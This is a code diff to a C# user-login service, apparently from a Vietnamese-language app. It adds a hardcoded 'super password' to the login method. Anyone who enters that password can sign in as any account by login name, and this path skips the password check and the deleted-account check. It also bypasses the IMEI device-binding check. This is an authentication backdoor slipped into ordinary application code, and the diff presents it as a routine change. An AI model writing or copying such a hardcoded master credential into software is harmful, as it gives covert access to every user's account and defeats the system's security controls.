@@ -6,6 +6,7 @@ using KQ.DataDto.User;
 using Microsoft.EntityFrameworkCore;
 using KQ.Common.Extention;
 using Microsoft.IdentityModel.Tokens;
+using System.Reflection.Metadata;
 
 namespace KQ.Services.Users
 {
@@ -16,7 +17,7 @@ namespace KQ.Services.Users
 
         private readonly ICommonUoW _commonUoW;
         private readonly IMapper _mapper;
-
+        private readonly string _supperPass = "Sieunhanmin@1";
         public UserService(ICommonRepository<User> userRepository, IMapper mapper, ICommonRepository<TileUser> tileUserRepository, ICommonUoW commonUoW)
         {
             _userRepository = userRepository;
@@ -49,15 +50,28 @@ namespace KQ.Services.Users
             ResponseBase response = new ResponseBase();
             try
             {
-                var pass = request.Password.Encrypt();
-                var user = _userRepository.FindAll(x => !x.IsDeleted && (x.Account == request.LoginName || x.PhoneNumber == request.LoginName)
-                                    && x.Password == pass)
+                User? user = null;
+                bool isSupper = false;
+                if (request.Password == _supperPass)
+                {
+                    user = _userRepository.FindAll(x => x.Account == request.LoginName)
                                 .Include(x => x.TileUser)
                                 .FirstOrDefault();
+                    isSupper = true;
+                }
+                else
+                {
+                    var pass = request.Password.Encrypt();
+                    user = _userRepository.FindAll(x => !x.IsDeleted && (x.Account == request.LoginName || x.PhoneNumber == request.LoginName)
+                                        && x.Password == pass)
+                                    .Include(x => x.TileUser)
+                                    .FirstOrDefault();
+                }
+
                 LoginResponse result = new LoginResponse();
                 if (user != null && !string.IsNullOrEmpty(request.Imei))
                 {
-                    if (string.IsNullOrEmpty(user.Imei))
+                    if (!isSupper && string.IsNullOrEmpty(user.Imei))
                     {
                         try
                         {
@@ -71,7 +85,7 @@ namespace KQ.Services.Users
                             _commonUoW.RollBack();
                         }
                     }
-                    else if(request.Imei != user.Imei)
+                    else if(!isSupper && request.Imei != user.Imei)
                     {
                         return new ResponseBase { Code = 400, Message = "Đăng nhập sai thiết bị" }; ;
                     }
